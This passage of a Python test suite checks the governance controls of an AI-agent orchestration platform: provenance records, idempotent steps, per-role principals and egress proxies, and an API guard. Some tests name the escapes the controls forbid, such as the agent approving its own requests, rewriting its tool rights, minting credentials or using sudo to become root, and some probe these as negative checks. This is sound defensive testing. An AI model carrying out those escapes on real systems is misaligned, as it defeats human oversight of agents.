    tj._view = lambda ui: view
    tj.calls_of = lambda v: calls
    tj.evidence_of = lambda v: {"decision": "PASS", "items": 3, "by": ["story"],
                                "linked_to_a_call": 3}
    t = tj.of_run("u1")
    check("the calls are counted by provider", t["by_provider"], {"claude": 1, "codex": 1})
    check("and by the principal they ran as",
          t["by_principal"], {"novel-author": 1, "novel-reviewer": 1})
    check("a rule deciding is not a person being asked",
          (t["permission_requests"], t["decided_by_rules"], t["approvals_requested"]), (3, 2, 1))
    check("a refusal by a rule is counted as one", t["rule_denials"], 1)
    check("retries are counted from attempts", t["retries"], 1)
    check("cost is summed, not invented", (t["tokens"], t["wall_ms"]), (150, 1500))
    check("the loop is read against the run's own bound", t["loop"],
          {"rounds": 1, "bound": 1, "within": True})
    a = t["assertions"]
    check("every assertion is true, false or unknown — never an opinion",
          sorted(a), ["every_call_had_a_principal", "loop_within_bound",
                      "reached_a_terminal_step", "recorded"])
    check("this run's assertions hold", [a[k] for k in sorted(a)], [True, True, True, True])

    # a loop over its bound is caught
    view2 = {**view, "output": {"decision": "BLOCK", "repairs": 3}}
    tj._view = lambda ui: view2
    check("a loop past its bound is false, not absent",
          tj.of_run("u1")["assertions"]["loop_within_bound"], False)

    # a call with no principal, where the workflow assigns them
    tj._view = lambda ui: view
    tj.calls_of = lambda v: [calls[0], {**calls[1], "principal": ""}]
    check("a call without its role's principal is caught",
          tj.of_run("u1")["assertions"]["every_call_had_a_principal"], False)

    # a workflow that assigns none is not judged for it
    tj.calls_of = lambda v: [{**c, "principal": ""} for c in calls]
    check("a workflow that assigns no principals is not accused",
          tj.of_run("u1")["assertions"]["every_call_had_a_principal"], None)

    src = open("/work/stack/trajectory.py", encoding="utf-8").read()
    for word in ("accuracy", "grade", "grader", "score", "correct"):
        check(f"it does not grade ({word})", word in src.lower().split("assertions")[0], False)


# ---------------------------------------------------------------- evidence, joined to its claim
def controls_evidence():
    print("evidence — a judgement says what it rests on")
    import io, contextlib, importlib.util as il
    ws = real_ws()
    ns = load("/work/packages/novel/steps/novel_stage.py", "ns_ev", ws)
    open(f"{ws}/draft.md", "w").write("a draft to judge\n")
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        ns.cmd_freeze()
    meta = json.load(open(f"{ws}/draft_meta.json", encoding="utf-8"))
    blocking = {"reviewer": "story", "usable": True, "verdict": "REPAIR",
                "findings": [{"kind": "CONTRACT_MISS", "severity": "BLOCKING",
                              "what": "the contracted change never happens"}]}
    ok = {"reviewer": "x", "usable": True, "verdict": "PASS",
          "findings": [{"kind": "NONE", "severity": "MINOR", "what": "fine"}]}
    members = {}
    for n, doc, prov, call in (("story", blocking, "codex", "run-story"),
                               ("history", ok, "claude", "run-history"),
                               ("cold", ok, "grok", "run-cold")):
        json.dump(doc, open(f"{ws}/review_{n}.json", "w"))
        members[n] = {"artifact": f"review_{n}.json", "provider": prov, "produced": True,
                      "status": "COMPLETED", "sha256": ns.sha_file(f"{ws}/review_{n}.json"),
                      "result": {"run_id": call, "provider": prov, "principal": "novel-reviewer",
                                 "evidence_dir": f"/work/evidence/p281/{call}"}}
    json.dump({"context": meta["draft_sha256"], "members": members},
              open(f"{ws}/reviews_round.json", "w"))
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        ns.cmd_triage("1")
    res = json.loads(buf.getvalue().strip().splitlines()[-1])
    idx = json.load(open(f"{ws}/evidence_index.json", encoding="utf-8"))
    check("the index is written and reported", (os.path.isfile(f"{ws}/evidence_index.json"),
                                                res["evidence_items"]), (True, len(idx["items"])))
    check("it names the judgement it explains", idx["decision"], "REPAIR")
    blocking_item = [i for i in idx["items"] if i.get("severity") == "BLOCKING"][0]
    check("a finding points at the call that made it", blocking_item["execution_id"], "run-story")
    check("and at the principal that call ran as", blocking_item["principal"], "novel-reviewer")
    check("and at the review it came from",
          blocking_item["review"]["sha256"], members["story"]["sha256"])
    check("and at the artifact it is about",
          (blocking_item["about"]["draft_id"], blocking_item["about"]["sha256"]),
          (meta["draft_id"], meta["draft_sha256"]))
    check("a reviewer that found nothing is still in the index",
          [i["by"] for i in idx["items"]].count("cold"), 1)
    shutil.rmtree(ws, ignore_errors=True)

    # the recorder keeps it with the run rather than leaving it in a workspace
    spec = il.spec_from_file_location("record_ev", "/work/stack/steps/record.py")
    rec = il.module_from_spec(spec)
    sys.modules["record_ev"] = rec
    spec.loader.exec_module(rec)
    sent = []
    rec.call = lambda path, body=None, method="POST": (
        sent.append((path, body)) or ({"experiment": {"experiment_id": "9"}} if "get-by-name" in path
                                      else {"run": {"info": {"run_id": "r1"}}} if path.endswith("runs/create")
                                      else {"runs": []} if path.endswith("runs/search") else {}))
    stored = []
    rec.put_artifact = lambda exp, rid, path, name="result.json": stored.append(name)
    root = tempfile.mkdtemp(prefix="agentstack-ev-")
    ev = os.path.join(root, "evidence_index.json")
    json.dump({"decision": "PASS", "items": [{"claim": "a"}, {"claim": "b"}]}, open(ev, "w"))
    os.environ["CONDUCTOR_SELF_RUN_ID"] = "run-ev"
    out = rec.record({"execute": {"run_id": "x", "provider": "claude", "status": "COMPLETED",
                                  "model_route": "direct", "model_session_reported": "",
                                  "model_adapter_reported": "", "model_served": "",
                                  "evidence_dir": "", "profile": "research-default"},
                      "check": {"decision": "PASS", "reason": "r", "file_sha256": "s"},
                      "evidence_file": ev, "route": {}})
    check("the index is stored with the record", stored, ["evidence_index.json"])
    check("and counted on it", out["evidence_items"], 2)
    tags = [t for p_, b in sent if p_.endswith("log-batch") for t in (b.get("tags") or [])]
    check("the count is a tag too", any(t["key"] == "evidence_items" for t in tags), True)
    shutil.rmtree(root, ignore_errors=True)


# ---------------------------------------------------------------- repeating a step
def controls_repeat():
    print("repeat — the same step run twice does not invent work")
    import glob as _glob, importlib.util as il, io, contextlib
    # 1) every step declares it
    # Every step, wherever it lives: the platform's and every package's. `vendor/` is not a step
    # (it is a library a package calls), so it is left out by path.
    step_files = sorted(f for f in (_glob.glob("/work/stack/steps/*.py")
                                    + _glob.glob("/work/packages/*/steps/*.py"))
                        if "/vendor/" not in f and not f.endswith("__init__.py"))
    missing = [os.path.basename(f) for f in step_files
               if "REPEATABLE" not in open(f, encoding="utf-8").read()]
    check("every step says what a repeat of it does", missing, [])
    vals = {}
    for f in step_files:
        m = re.search(r'REPEATABLE = "(\w+)"', open(f, encoding="utf-8").read())
        if m:
            vals[os.path.basename(f)] = m.group(1)
    check("a model call is never claimed repeatable",
          [k for k in ("agent_task.py", "execute.py", "tasks.py", "task_chain.py")
           if vals.get(k) != "no"], [])

    ws = real_ws()
    ns = load("/work/packages/novel/steps/novel_stage.py", "ns_rep", ws)
    open(f"{ws}/draft.md", "w").write("one and only draft\n")

    def freeze():
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            ns.cmd_freeze()
        return json.loads(buf.getvalue().strip().splitlines()[-1])

    # 2) freezing the same bytes is the same round — it used to mint a new draft each time
    first = freeze()
    again = freeze()
    check("freezing the same draft twice is one round",
          (first["draft_id"], again["draft_id"], again.get("repeated")), ("d01", "d01", True))
    open(f"{ws}/draft.md", "w").write("a repaired draft\n")
    check("a different draft is a new round", freeze()["draft_id"], "d02")

    # 3) a repeated triage must not spend a repair round
    blocking = {"reviewer": "x", "usable": True, "verdict": "REPAIR",
                "findings": [{"kind": "FACT_ERROR", "severity": "BLOCKING", "what": "wrong"}]}
    ok = {"reviewer": "x", "usable": True, "verdict": "PASS",
          "findings": [{"kind": "NONE", "severity": "MINOR", "what": "f"}]}
    meta = json.load(open(f"{ws}/draft_meta.json", encoding="utf-8"))
    members = {}
    for n, doc in (("story", blocking), ("history", ok), ("cold", ok)):
        json.dump(doc, open(f"{ws}/review_{n}.json", "w"))
        members[n] = {"artifact": f"review_{n}.json", "status": "COMPLETED", "produced": True,
                      "sha256": ns.sha_file(f"{ws}/review_{n}.json")}
    json.dump({"context": meta["draft_sha256"], "members": members},
              open(f"{ws}/reviews_round.json", "w"))
    seen = []
    for _ in range(3):
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            ns.cmd_triage("2")
        d = json.loads(buf.getvalue().strip().splitlines()[-1])
        seen.append((d["decision"], d["repairs_done"]))
    check("a repeated triage neither spends a round nor flips to BLOCK",
          seen, [("REPAIR", 0)] * 3)
    shutil.rmtree(ws, ignore_errors=True)

    # 4) the record of one run and one judgement is written once
    spec = il.spec_from_file_location("record_rep", "/work/stack/steps/record.py")
    rec = il.module_from_spec(spec)
    sys.modules["record_rep"] = rec
    spec.loader.exec_module(rec)
    created, store = [], {}
    def fake(path, body=None, method="POST"):
        if "get-by-name" in path:
            return {"experiment": {"experiment_id": "9"}}
        if path.endswith("runs/search"):
            k = body["filter"].split("'")[1]
            return {"runs": [{"info": {"run_id": store[k]}}]} if k in store else {"runs": []}
        if path.endswith("runs/create"):
            created.append(body.get("run_name"))
            return {"run": {"info": {"run_id": f"r{len(created)}"}}}
        if path.endswith("log-batch"):
            for t in body.get("tags", []):
                if t["key"] == "idempotency_key" and t["value"]:
                    store[t["value"]] = body["run_id"]
        return {}
    rec.call, rec.put_artifact = fake, (lambda *a: None)
    os.environ["CONDUCTOR_SELF_RUN_ID"] = "run-abc"
    ex = {"run_id": "run-1", "provider": "claude", "status": "COMPLETED", "model_route": "direct",
          "model_session_reported": "", "model_adapter_reported": "", "model_served": "",
          "evidence_dir": "", "profile": "research-default", "measurements": {}}
    pay = {"execute": ex, "check": {"decision": "PASS", "reason": "r", "file_sha256": "abc"},
           "route": {}}
    ids = [rec.record(pay)["mlflow_run_id"] for _ in range(3)]
    check("recording the same run and judgement writes one record", (ids, len(created)),
          (["r1", "r1", "r1"], 1))
    other = rec.record({**pay, "check": {"decision": "BLOCK", "reason": "r", "file_sha256": "abc"}})
    check("a different judgement is a different record", other["mlflow_run_id"], "r2")


# ---------------------------------------------------------------- tool rights per step
def controls_step_rights():
    print("step-rights — a step runs with its role's rights, not the run's")
    import subprocess, types
    root = tempfile.mkdtemp(prefix="agentstack-princ-")
    ev = os.path.join(root, "route")
    os.makedirs(ev)
    json.dump({"decision": "ROUTE", "provider": "codex", "reason": "x",
               "evaluated": [{"provider": p, "eligible": True, "why": "within limits"}
                             for p in ("codex", "claude", "grok")]},
              open(f"{ev}/decision.json", "w"))
    out = json.loads(subprocess.run(
        ["/opt/venv/bin/python", "/work/stack/steps/roles.py", "research-default", ev,
         "author=claude:novel-author", "story=codex:novel-reviewer", "cold=grok"],
        capture_output=True, text=True).stdout.strip().splitlines()[-1])
    check("a role carries the principal it runs as", out["author_principal"], "novel-author")
    check("two roles on different vendors can share one",
          out["story_principal"], "novel-reviewer")
    check("a role without one is still bound", (out["cold_provider"], out["cold_principal"]),
          ("grok", ""))
    check("the vendor is unchanged by it", out["author_provider"], "claude")
    shutil.rmtree(root, ignore_errors=True)

    # it has to reach the call, or it is decoration
    at = open("/work/stack/steps/agent_task.py", encoding="utf-8").read()
    check("the task passes it to the adapter", '"mcp_principal": principal' in at, True)
    check("and only when there is one", 'if principal else {}' in at, True)
    ad = open("/work/stack/run-agent.mjs", encoding="utf-8").read()
    check("the adapter fails closed without the credential",
          "is not set" in ad and "PRELOOP_MCP_" in ad, True)

    y = open("/work/packages/novel/novel-a.yaml", encoding="utf-8").read()
    check("the author and the reviewers are different principals",
          ("author=claude:novel-author" in y and "story=codex:novel-reviewer" in y), True)
    for role in ("architect", "author", "story", "history", "cold"):
        check(f"{role}'s call carries its principal", f"{role}_principal" in y, True)

    comp = open("/work/docker/compose.poc.yaml", encoding="utf-8").read()
    check("their credentials come from a file that is not versioned",
          "principals.env" in comp, True)
    check("and that file is ignored by git",
          "principals.env" in open("/work/docker/.gitignore", encoding="utf-8").read(), True)


# ---------------------------------------------------------------- the panel and its one control
def controls_panel():
    print("panel — only what needs a person, and one implementation behind it")
    import importlib.util
    spec = importlib.util.spec_from_file_location("approvals_ctl", "/work/stack/approvals.py")
    ap = importlib.util.module_from_spec(spec)
    sys.modules["approvals_ctl"] = ap
    spec.loader.exec_module(ap)
    check("answering an approval is offered here", hasattr(ap, "decide"), True)

    ops = open("/work/ops/server.py", encoding="utf-8").read()
    check("the panel can answer one", "/api/approvals/([0-9a-f-]{36})" in ops, True)
    check("and only with a decision it knows",
          'decision must be approve or decline' in ops, True)
    for absent, why in (("/api/cycle", "starting a cycle"), ("/api/cleanup", "deleting runs"),
                        ("/api/composition", "changing the composition")):
        check(f"the panel does not offer {why}", absent in ops, False)

    # the run dashboard: one address for a person, and the container that holds the workspace
    # mount is not the one a browser talks to
    import yaml
    svcs = (yaml.safe_load(open("/work/docker/compose.poc.yaml", encoding="utf-8"))
            or {}).get("services") or {}
    check("the replay dashboard publishes no port of its own",
          bool((svcs.get("replay") or {}).get("ports")), False)
    check("it mounts the workspace read-only",
          all(v.get("read_only") for v in (svcs.get("replay") or {}).get("volumes") or []), True)
    check("the browser-facing container mounts nothing",
          bool((svcs.get("hub") or {}).get("volumes")), False)
    hub = open("/work/hub/server.py", encoding="utf-8").read()
    check("the hub forwards exactly the dashboard's own paths",
          all(x in hub for x in ("/api/state", "/assets/", "/conductor")), True)

    # the switches in someone else's console that would make this panel's claims untrue
    import importlib.util as il
    spec2 = il.spec_from_file_location("elsewhere_ctl", "/work/stack/elsewhere.py")
    ew = il.module_from_spec(spec2)
    sys.modules["elsewhere_ctl"] = ew
    spec2.loader.exec_module(ew)
    st = ew.state()
    check("approval bypasses are read", "approval_bypasses" in st or "approval_bypasses_error" in st, True)
    check("the registered MCP servers are read", "mcp_servers" in st or "mcp_servers_error" in st, True)
    src = open("/work/stack/elsewhere.py", encoding="utf-8").read()
    check("and only read — nothing there is edited from here",
          any(m in src for m in ('method="POST"', 'method="PUT"', 'method="DELETE"')), False)

    page = open("/work/hub/index.html", encoding="utf-8").read()
    check("the page asks before it decides", "confirm(" in page, True)
    check("and says where the rest is done", "scripts/up.sh --check" in page, True)

    # one cycle implementation, and its arguments read the way a scheduler passes them
    spec = importlib.util.spec_from_file_location("cycle_ctl", "/work/stack/cycle.py")
    cy = importlib.util.module_from_spec(spec)
    sys.modules["cycle_ctl"] = cy
    spec.loader.exec_module(cy)
    check("the lock is a directory beside the record", cy.LOCK.endswith(".cycle.lock.d"), True)
    sh = open("/work/scripts/cycle.sh", encoding="utf-8").read()
    check("the shell entry point holds no rules of its own", "stack/cycle.py" in sh, True)
    check("and does not re-implement the lock", "LOCKDIR" in sh, False)

    check("an option's value is not the profile",
          cy.parse_args(["trading-b", "--by", "scheduler"])["profile"], "research-default")
    check("a profile given as a positional still works",
          cy.parse_args(["trading-b", "cost-first"])["profile"], "cost-first")
    check("and the caller is carried",
          cy.parse_args(["trading-b", "--by", "scheduler"])["by"], "scheduler")
    check("retention is only what was asked for",
          [cy.parse_args(["trading-b"])["retain_days"],
           cy.parse_args(["trading-b", "--retain-days", "14"])["retain_days"]], [None, "14"])

    # a router that holds before the roles step must not break the workflow's own hold message
    for name in ("novel-a", "trading-b", "trading-shapes"):
        import glob as _g2
        path = next(f for f in _g2.glob("/work/packages/*/*.yaml") if f.endswith("/" + name + ".yaml"))
        y = open(path, encoding="utf-8").read()
        hold = [l for l in y.splitlines() if "HOLD:" in l]
        check(f"{name}: the hold message survives an early hold",
              all(("roles" not in l) or ("roles is defined" in l) for l in hold), True)


# ---------------------------------------------------------------- a reduced composition
def controls_composition():
    print("reduced — what a composition may drop, and what a run is refused for")
    sys.path.insert(0, "/work/stack")
    import capabilities

    def caps(**avail):
        base = {"tool_rights": True, "approvals": True, "egress": True, "record": True,
                "admission": True}
        base.update(avail)
        return {k: {"available": v, "required": k in ("tool_rights", "approvals", "egress"),
                    "without_it": "", "detail": ""} for k, v in base.items()}

    check("everything there → nothing missing",
          capabilities.missing(caps()), [])
    check("no recording, and no one said so → refused",
          capabilities.missing(caps(record=False)), ["record"])
    check("no recording, said so → allowed",
          capabilities.missing(caps(record=False), need_record=False), [])
    check("no tool rights → refused even with the opt-in",
          capabilities.missing(caps(tool_rights=False), need_record=False), ["tool_rights"])
    check("no egress → refused even with the opt-in",
          capabilities.missing(caps(egress=False), need_record=False), ["egress"])
    check("stale quota is reported, not a refusal (the router holds the run itself)",
          capabilities.missing(caps(admission=False), need_record=False), [])

    import yaml                                   # the compose file itself, not a guess at it
    svcs = (yaml.safe_load(open("/work/docker/compose.poc.yaml", encoding="utf-8"))
            or {}).get("services") or {}
    optional = sorted(n for n, v in svcs.items() if (v or {}).get("profiles"))
    # the screen's services (hub, ops, the replay dashboard) and recording are the optional ones
    check("only these services are optional", optional, ["hub", "mlflow", "ops", "replay"])
    for must in ("egress", "toolsvc", "fsmcp", "quota", "agent"):
        check(f"{must} can never be dropped", must in optional, False)

    up = open("/work/scripts/up.sh", encoding="utf-8").read()
    for name in ("full", "no-record", "runtime"):
        check(f"up.sh knows the {name} composition", f"  {name})" in up or f"  {name})" in up, True)
    check("an unknown composition is refused", "unknown composition:" in up, True)
    check("a composition that drops a service also stops it", "rm -sf $drop" in up, True)
    down = open("/work/scripts/down.sh", encoding="utf-8").read()
    check("down takes everything, whatever was up", 'COMPOSE_PROFILES="record,ui"' in down, True)


def controls_approval_boundary():
    print("")
    print("the approval boundary — a route, and it says so")
    guard = open("/work/docker/apiguard.conf", encoding="utf-8").read()
    compose = open("/work/docker/compose.poc.yaml", encoding="utf-8").read()
    preloop = open("/work/docker/preloop.agentstack.yaml", encoding="utf-8").read()
    up = open("/work/scripts/up.sh", encoding="utf-8").read()

    # what the guard refuses, and what it deliberately does not. The refusals are one table, so
    # the control reads that table rather than the file: a rule elsewhere would not be enforced.
    table = guard.split("$guard_refusal {")[1].split("}")[0]
    for verb in ("approve", "decline", "decide"):
        check(f"deciding by {verb} is refused", verb in table, True)
    check("a write to the standing bypasses is refused",
          "/api/v1/approval-bypasses" in table, True)
    check("rewriting the rules it is judged by is refused", "governance" in table, True)
    check("minting itself another identity is refused", "auth/api-keys" in table, True)
    # The Preloop CLI's own `policy apply` wrote through endpoints an enumerated list did not
    # name, and succeeded from the agent until the table refused writes by default. So the table
    # ends with a catch-all, and the exceptions are named before it.
    check("every other write to the control plane is refused too",
          table.rstrip().splitlines()[-1].strip().startswith('"~^[A-Z]+ /api/v1/"'), True)
    reads = table.index('"~^(GET|HEAD|OPTIONS) "')
    hook = table.index('"~^POST /api/v1/agents/permission-check$"')
    mcp = table.index('"~^POST /mcp/v1"')
    catch = table.index('"~^[A-Z]+ /api/v1/"')
    check("reading is allowed, and named before the catch-all", reads < catch, True)
    check("the permission hook is named, and before the catch-all", hook < catch, True)
    check("MCP itself is named, and before the catch-all", mcp < catch, True)
    check("reading what is waiting is not refused", "Reading is untouched" in guard, True)
    check("the refusal does not depend on the credential presented",
          "whatever credential is presented" in guard, True)

    # the agent resolves Preloop's names to the guard, and Preloop itself is off that network
    for name in ("api", "console", "gateway"):
        check(f"the guard holds the name {name}", f"aliases: [api, console, gateway]" in compose, True)
        check(f"Preloop answers to preloop-{name} on the admin side",
              f"aliases: [preloop-{name}, {name}]" in preloop, True)
    check("Preloop is no longer on the governed network",
          "poc-governed:" not in preloop.split("networks:")[-1], True)
    check("the agent is not on the admin network",
          "adminnet" not in compose.split("  agent:")[1].split("  mlflow:")[0], True)

    # the panel decides from the admin side, with the code and a credential it can read
    check("the panel reaches Preloop past the guard",
          "AGENTSTACK_PRELOOP_API: http://preloop-api:8000" in compose, True)
    ops_server = open("/work/ops/server.py", encoding="utf-8").read()
    check("the panel runs the decision itself, not in the agent",
          'jlocal(["/work/stack/approvals.py", "decide"' in ops_server, True)
    check("applying a policy runs on the admin side",
          'container=ADMIN if what == "apply"' in ops_server, True)
    check("generating it does not — the provider logins are in the agent",
          'what == "apply" else None' in ops_server, True)
    admin_block = compose.split("  admin:")[1].split("  apiguard:")[0]
    check("the operator's container is on the admin network and no other",
          admin_block.split("networks:")[1].split("volumes:")[0].split(), ["-", "adminnet"])
    check("a rules edit that is not reloaded is not a rule", "nginx -s reload" in up, True)

    # approvals.py takes both from where it runs
    import importlib.util as il, os
    spec = il.spec_from_file_location("appr_ctl", "/work/stack/approvals.py")
    ap = il.module_from_spec(spec); sys.modules["appr_ctl"] = ap; spec.loader.exec_module(ap)
    old_env = dict(os.environ)
    try:
        os.environ["AGENTSTACK_PRELOOP_API"] = "http://preloop-api:8000"
        os.environ["PRELOOP_OPERATOR_TOKEN"] = "an-operators-own"
        check("the address comes from where it runs", ap._api(), "http://preloop-api:8000")
        check("an operator's own credential is used first", ap._token(), "an-operators-own")
        del os.environ["PRELOOP_OPERATOR_TOKEN"]
        os.environ["AGENTSTACK_CREDENTIAL_HOME"] = "/nowhere"
        try:
            ap._token(); ok = False
        except RuntimeError:
            ok = True
        check("with no credential it fails closed rather than borrowing one", ok, True)
    finally:
        os.environ.clear(); os.environ.update(old_env)

    # and the boundary is checked from the position it constrains, on every bring-up
    check("every bring-up checks the runtime may read approvals",
          'check "runtime may read approvals"       200' in up, True)
    check("every bring-up checks the runtime may not decide them",
          'check "runtime may not decide approvals" 403' in up, True)
    check("and that it may read its rights but not rewrite them",
          'check "runtime may read its tool rights"  200' in up
          and 'check "runtime may not rewrite them"      403' in up, True)
    check("and that it may not mint a credential",
          'check "runtime may not mint credentials"  403' in up, True)

    # the claim is not overstated anywhere
    ops = open("/work/stack/ops_health.py", encoding="utf-8").read()
    check("the probe reports the position it was run from, not a property of the credential",
          "This probe runs wherever it is run from, which is the point" in ops, True)


def controls_review_findings():
    """Three defects a reader of the common code found, and what each one now does instead.

    None of them showed up in a run: each is a place where the platform answered a question with
    something other than what was asked — a different profile, one of two packages, or a record
    that said nothing had been judged. They are pinned here because a reading found them and only
    a control keeps them found.
    """
    print("")
    print("what a reading of the common code found (OPERATIONS §38)")
    import capabilities as _caps, packages as _pk, json as _j, os as _o, shutil as _sh
    import settings as _st

    # 1. admission is a question about a routing policy, and there is more than one
    check("admission is asked of the profile the run selected",
          _caps.probe.__defaults__ is not None
          and "settings.profile(profile)" in open("/work/stack/capabilities.py",
                                                  encoding="utf-8").read(), True)
    detail = {n: _caps.probe(n)["admission"]["detail"] for n in ("research-default", "cost-first")}
    check("and the answer names it", all(n in detail[n] for n in detail), True)
    check("a profile that does not exist is not silently a default",
          _caps.probe("no-such-profile")["admission"]["available"], False)
    rw = open("/work/stack/run_workflow.py", encoding="utf-8").read()
    check("the runner passes its own profile to the probe", "capabilities.probe(profile)" in rw, True)
    check("and refuses a run on a profile that is not there",
          "settings.profile(profile) is None" in rw, True)
    # what is on disk, not a list written here: a composition may carry a third profile
    import glob as _g5
    on_disk = sorted(_o.path.basename(f)[:-5]
                     for f in _g5.glob("/work/config/generated/profiles/*.json"))
    check("naming the profiles there are", sorted(_st.profile_names()), on_disk)
    check("and there is at least the pair every measurement used",
          all(n in on_disk for n in ("cost-first", "research-default")), True)

    # 2. one name, two packages
    made = []
    real_decl = _pk.DECL
    # The loader loads what this instance declares, so the collision has to be declared to happen
    # at all. Written as a temp declaration the subprocess reads too (AGENTSTACK_PACKAGES_YAML).
    tmp_decl = "/tmp/packages-collision.yaml"
    with open(real_decl, encoding="utf-8") as f:
        open(tmp_decl, "w", encoding="utf-8").write(
            f.read() + chr(10) + "  zz-dup-one: {from: local}" + chr(10)
            + "  zz-dup-two: {from: local}" + chr(10))
    _pk.DECL = tmp_decl
    try:
        for pkg, cap in (("zz-dup-one", "record"), ("zz-dup-two", "admission")):
            d = f"/work/packages/{pkg}"
            _o.makedirs(d, exist_ok=True)
            made.append(d)
            open(f"{d}/manifest.yaml", "w").write(chr(10).join(
                [f"name: {pkg}", "version: 0.0.1", "description: a control's collision",
                 "workflows:", "  zz-shared: workflow.yaml",
                 "requires:", f"  capabilities: [{cap}]", ""]))
            open(f"{d}/workflow.yaml", "w").write(
                chr(10).join(["workflow:", f"  name: {pkg}", ""]))
        offered, conflicts = _pk.workflows(with_conflicts=True)
        check("a workflow name two packages declare is carried by neither",
              "zz-shared" in offered, False)
        check("and the conflict names both",
              [c["declared_by"] for c in conflicts if c["workflow"] == "zz-shared"],
              [["zz-dup-one", "zz-dup-two"]])
        check("neither package's requires is used for it", _pk.requires_of("zz-shared"), ([], ""))
        import subprocess as _sp, sys as _sy
        out = _j.loads(_sp.run([_sy.executable, "/work/stack/run_workflow.py", "start",
                                "zzdup-probe", "zz-shared", "research-default"],
                               capture_output=True, text=True,
                               env={**_o.environ, "AGENTSTACK_PACKAGES_YAML": tmp_decl}).stdout.strip())
        check("and a run refused for it says which packages are fighting over the name",
              "both declare it" in (out.get("why") or ""), True)
    finally:
        _pk.DECL = real_decl
        for d in made:
            _sh.rmtree(d, ignore_errors=True)
    check("with the collision gone, the loader is itself again",
          "zz-shared" in _pk.workflows(), False)

    # 3. a run may judge without calling a model
    rec = open("/work/stack/steps/record.py", encoding="utf-8").read()
    check("a decision reached without a model call is not recorded as NOT_RUN",
          'NO_EXECUTION" if decided else "HOLD"' in rec, True)
    check("and its evidence is kept with it",
          "attach_evidence(payload, exp_id, rid) if decided" in rec, True)

    # 5. the means a package needs to guard an effect of its own, and to have one at all
    comp = open("/work/docker/compose.poc.yaml", encoding="utf-8").read()
    gi = open("/work/docker/.gitignore", encoding="utf-8").read()
    check("a package may have credentials of its own, not the trading package's file",
          "path: package.env" in comp, True)
    check("and they are never versioned", "package.env" in gi, True)
    check("a resumed run keeps its workspace, so a marker there survives it",
          "keeps its conductor run id" in open("/work/docs/packages.md", encoding="utf-8").read(),
          True)

    # 4. what "produced" means when a step is run again in the same workspace
    at = open("/work/stack/steps/agent_task.py", encoding="utf-8").read()
    check("produced means this attempt wrote the file",
          "bool(after) and not stale" in at, True)
    check("a file left by an earlier attempt is reported, not deleted",
          '"produced_stale": stale' in at and "os.remove" not in at, True)


BS = chr(92)


def controls_role_egress():
    """Per-role egress: the hosts a role may reach, and the uid that keeps its credential its own.

    Everything here is local — no host on the internet is contacted. What the proxy does with a
    declared host was measured by hand and is recorded in OPERATIONS §48; what a control can hold
    every time is the shape: the list it serves, the refusal without a credential, who may become
    whom, and which uid owns what.
    """
    print("")
    print("per-role egress — a role's hosts, and the uid that keeps its credential (OPERATIONS §48)")
    import importlib.util as _il5, os as _o5, subprocess as _sp5, sys as _sy5
    _s5 = _il5.spec_from_file_location("role_eg", "/work/stack/role_egress.py")
    re_ = _il5.module_from_spec(_s5); _s5.loader.exec_module(re_)

    plan = re_.plan()
    rows = plan["roles"]
    check("a role that declares hosts is given a uid and a port of its own",
          all(r["uid"] and r["port"] for r in rows.values()), True)
    check("and the map is stable, not positional",
          re_.assignment() == re_.assignment(), True)
    check("every role's uid is in the range the sudoers rule allows, and is never root",
          all(1100 <= r["uid"] < 1500 for r in rows.values()), True)

    for role, r in rows.items():
        allow = open(f"{re_.CREDS}/{role}.allow", encoding="utf-8").read().splitlines()
        want = ["^" + h.replace(".", chr(92) + ".") + "$" for h in re_.BASELINE + r["hosts"]]
        check(f"{role}'s list is the providers plus what it declared", allow, want)
        st = _o5.stat(f"{re_.CREDS}/{role}.cred")
        check(f"{role}'s credential is 0600 and owned by that role",
              (oct(st.st_mode)[-3:], st.st_uid), ("600", r["uid"]))
        # and unreadable to anything that is not that role: as this process (the agent), it is not
        check("and the agent that launches the step cannot read it",
              _o5.access(f"{re_.CREDS}/{role}.cred", _o5.R_OK), False)
        port = r["port"]
        # the proxy answers, and refuses without the credential. Local: nothing leaves the network.
        rc = _sp5.run(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "6",
                       "-x", f"http://egress:{port}", "https://api.anthropic.com"],
                      capture_output=True, text=True).stdout.strip()
        check(f"{role}'s proxy refuses a caller with no credential", rc, "000")

    # who may become whom. sudo is the only way to a role, and it goes one way.
    def as_agent(*argv):
        return _sp5.run(list(argv), capture_output=True, text=True)

    role = sorted(rows)[0] if rows else ""
    if role:
        r1 = as_agent("sudo", "-n", "-u", role, "/usr/local/bin/role-exec", role, "--", "id", "-un")
        check("the launcher may become a role", (r1.returncode, r1.stdout.strip()), (0, role))
        r2 = as_agent("sudo", "-n", "-u", "root", "/usr/local/bin/role-exec", role, "--", "id", "-un")
        check("and may not become root", r2.returncode == 0, False)
        r3 = as_agent("sudo", "-n", "-u", role, "/usr/local/bin/role-exec", "some-other-role",
                      "--", "id", "-un")
        check("role-exec refuses to run a step under a role it is not",
              (r3.returncode, "sudo did not switch" in r3.stderr or "no uid" in r3.stderr), (4, True))
        r4 = as_agent("sudo", "-n", "-u", role, "/usr/local/bin/role-exec", role, "--",
                      "sh", "-c", "echo $AGENTSTACK_ROLE; echo ${HTTPS_PROXY%%://*}")
        check("a step run as a role is told which role it is, and is handed a proxy",
              r4.stdout.split(), [role, "http"])

    # "the providers and nothing else" is a declaration a role can make
    import tempfile as _tf6, pathlib as _pl6
    reader = re_.declared
    try:
        re_.declared = lambda: {"zz-empty": [], "zz-hosts": ["example.test"]}
        got = {k: v for k, v in re_.plan()["roles"].items() if k.startswith("zz-")}
        check("an empty egress list is a declaration, not an absence",
              sorted(got), ["zz-empty", "zz-hosts"])
        check("and it means the providers and nothing else",
              got["zz-empty"]["hosts"], [])
    finally:
        re_.declared = reader
    check("a role that declares nothing at all is not given a uid",
          "zz-none" in re_.plan()["roles"], False)

    # a step that would be confined and cannot be is refused by name, not left to a vendor error
    at6 = open("/work/stack/steps/agent_task.py", encoding="utf-8").read()
    check("a model step on a CLI that cannot run as a role is refused, naming the rule",
          ('if role_uid and provider in ("codex",)' in at6
           and "OPERATIONS §48" in at6 and "builds its own sandbox" in at6), True)
    check("and it is a refusal, not a quiet fall back to the shared allowlist",
          "raise SystemExit(0)" in at6.split('if role_uid and provider in ("codex",)')[1][:1200],
          True)

    src5 = open("/work/docker/agent.Dockerfile", encoding="utf-8").read()
